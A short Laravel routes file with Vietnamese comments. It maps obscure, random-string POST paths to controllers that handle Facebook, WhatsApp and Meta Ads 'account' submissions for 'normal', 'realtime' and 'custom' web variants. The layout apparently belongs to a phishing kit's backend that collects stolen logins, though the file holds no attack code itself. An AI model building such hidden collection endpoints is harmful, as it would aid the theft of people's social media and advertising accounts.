<?php

use App\Http\Controllers\CustomWeb;
use App\Http\Controllers\NormalWeb;
use App\Http\Controllers\RealtimeWeb;
use Illuminate\Support\Facades\Route;

// Acc của web thường
Route::post('nfrhvgbibgnjhbngfjibngj', [NormalWeb::class, 'post'])->name('post.normalweb');
// Acc web realtime
Route::post('jirejfgihfvbgjfdighuifdghuibhdbg', [RealtimeWeb::class, 'facebook_post'])->name('post.realtimeweb.facebook');
Route::post('jikfdjbiovdjhgiiureiutrgurthu', [RealtimeWeb::class, 'whatsapp_post'])->name('post.realtimeweb.whatsapp');
// acc custom web
Route::post('jfjhgjg85758tyughfghg', [CustomWeb::class, 'facebook_post'])->name('post.customweb.facebook');
Route::post('kmcnvmvkfo3058hgjvmnv', [CustomWeb::class, 'whatsapp_post'])->name('post.customweb.whatsapp');

// METAADS CUSTOM THEME
Route::post('mrdfifrjg9858tr5jgig8ggfyuu38938', [CustomWeb::class, 'metaads_post'])->name('post.customweb.metaads');